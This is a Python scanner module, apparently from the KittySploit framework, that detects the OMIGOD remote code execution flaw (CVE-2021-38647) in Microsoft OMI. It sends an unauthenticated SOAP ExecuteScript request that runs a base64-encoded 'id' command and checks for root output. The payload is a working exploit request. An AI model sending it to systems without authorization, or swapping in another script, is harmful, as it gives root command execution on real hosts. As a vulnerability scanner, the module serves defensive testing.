#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microsoft Open Management Infrastructure is susceptible to remote code execution (OMIGOD)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microsoft Open Management Infrastructure - Remote Code Execution Detection',
        'description': 'Microsoft Open Management Infrastructure is susceptible to remote code execution (OMIGOD).',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'rce', 'omi', 'microsoft', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure',
            'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647',
            'https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647',
            'https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/',
            'https://github.com/microsoft/omi',
        ],
        'cve': 'CVE-2021-38647',
    }

    def run(self):
        path = '/wsman'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/soap+xml;charset=UTF-8'}, data='<s:Envelope\n  xmlns:s="http://www.w3.org/2003/05/soap-envelope"\n  xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"\n  xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"\n  xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n  xmlns:xsi="http://www.w3.org/2001/XMLSchema"\n  xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"\n  xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">\n  <s:Header>\n    <a:To>HTTP://{{Hostname}}/wsman/</a:To>\n    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>\n    <a:ReplyTo>\n      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n    </a:ReplyTo>\n    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>\n    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>\n    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>\n    <w:OperationTimeout>PT1M30S</w:OperationTimeout>\n    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>\n    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>\n    <w:OptionSet s:mustUnderstand="true"/>\n    <w:SelectorSet>\n      <w:Selector Name="__cimnamespace">root/scx</w:Selector>\n    </w:SelectorSet>\n  </s:Header>\n  <s:Body>\n    <p:ExecuteScript_INPUT\n      xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">\n      <p:Script>aWQ=</p:Script>\n      <p:Arguments/>\n      <p:timeout>0</p:timeout>\n      <p:b64encoded>true</p:b64encoded>\n    </p:ExecuteScript_INPUT>\n  </s:Body>\n</s:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<p:StdOut>', 'uid=0(root) gid=0(root) groups=0',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Microsoft Open Management Infrastructure - Remote Code Execution detected', path=path)
            return True
        return False

